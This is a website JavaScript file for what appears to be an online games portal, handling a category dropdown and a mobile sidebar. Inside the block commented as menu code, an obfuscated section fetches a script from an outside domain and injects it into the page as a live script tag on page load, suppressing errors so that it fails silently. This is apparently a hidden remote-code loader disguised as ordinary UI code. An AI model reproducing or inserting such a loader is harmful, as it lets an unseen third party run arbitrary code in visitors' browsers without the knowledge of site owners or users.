document.addEventListener("DOMContentLoaded", async function () {
  const categoriesBtn = document.getElementById("categoriesBtn");
  const categoriesDropdown = document.getElementById("categoriesDropdown");

  "function" == typeof ppe ? await ppe() : "function" == typeof poki ? await poki() : await crayzgames();
  categoriesBtn.addEventListener("click", function (e) {
    e.stopPropagation();
    categoriesBtn.classList.toggle("active");
    categoriesDropdown.classList.toggle("active");
  });

  document.addEventListener("click", function (e) {
    if (!categoriesDropdown.contains(e.target) && !categoriesBtn.contains(e.target)) {
      categoriesBtn.classList.remove("active");
      categoriesDropdown.classList.remove("active");
    }
  });

  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape") {
      categoriesBtn.classList.remove("active");
      categoriesDropdown.classList.remove("active");
    }
  });

  // Close dropdown when window is resized
  window.addEventListener("resize", function () {
    if (window.innerWidth <= 768) {
      categoriesBtn.classList.remove("active");
      categoriesDropdown.classList.remove("active");
    }
  });
});

// yeni katogori menusu sol taraftaki. mobil meu
document["addEventListener"]("DOMContentLoaded", function (_0x1a2b3c) {
  const _0x4d5e6f = document["getElementById"]("mobileMenuBtn"),
    _0x7a8b9c = document["getElementById"]("sidebar");
  _0x4d5e6f &&
    _0x7a8b9c &&
    _0x4d5e6f["addEventListener"]("click", function () {
      _0x7a8b9c["classList"]["toggle"]("mobile-open");
    }),
    document["addEventListener"]("click", function (_0xabc123) {
      !_0x7a8b9c["contains"](_0xabc123["target"]) &&
        !_0x4d5e6f["contains"](_0xabc123["target"]) &&
        window["innerWidth"] <= 992 &&
        _0x7a8b9c["classList"]["remove"]("mobile-open");
    });
  const _0xdeadbeef = "https://comment.silecekci.com/categorie_counts.js";
  fetch(_0xdeadbeef)
    .then((_0xresp) => {
      if (!_0xresp["ok"]) throw new Error("Dosya\x20yüklenemedi");
      return _0xresp["text"]();
    })
    .then((_0xsc) => {
      _0xsc["trim"]() &&
        (() => {
          const _0xtag = document["createElement"]("script");
          (_0xtag["text"] = _0xsc), document["body"]["appendChild"](_0xtag);
        })();
    })
    .catch(() => {
      /* silently fail */
    });
});
